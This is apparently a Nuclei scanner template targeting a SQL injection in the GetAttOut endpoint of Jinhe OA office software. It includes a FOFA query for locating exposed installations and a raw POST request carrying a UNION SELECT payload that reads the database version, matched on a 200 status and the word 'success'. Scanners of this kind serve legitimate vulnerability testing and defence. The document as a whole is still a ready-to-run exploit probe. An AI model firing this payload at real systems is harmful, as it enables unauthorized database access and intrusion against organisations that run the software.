id: jinhe-oa-getattout-sqli

info:
  name: "金和 OA 系统 GetAttOut 接口 SQL 注入"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="金和网络-金和OA" || body="/jc6/platform/sys/login"
          金和OA系统中GetAttOut接口被发现存在SQL注入漏洞，攻击者可通过构造恶意请求实施注入攻击。
  tags: 金和OA

http:
- raw:
  - |
    POST /jc6/JHSoft.WCF/TEST/GetAttOut HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Upgrade-Insecure-Requests: 1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Content-Type: application/x-www-form-urlencoded

    1' union select null,null,@@version,null,null,null--
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'success'
